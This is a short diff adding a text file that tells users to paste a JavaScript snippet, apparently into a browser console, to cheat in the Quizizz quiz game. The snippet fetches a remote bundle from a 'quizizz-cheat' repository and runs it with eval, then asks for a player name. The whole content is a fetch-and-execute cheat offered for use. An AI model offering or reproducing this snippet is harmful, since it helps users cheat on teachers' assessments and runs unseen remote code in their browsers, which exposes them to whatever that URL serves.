@@ -1,0 +1,8 @@
+copy this
+
+
+fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/oldmethod/dist/bundle.js")
+.then((res) => res.text()
+.then((t) => eval(t)))
+
+past and a pop up will ask for a name just put a player name in the game it is case sensitive
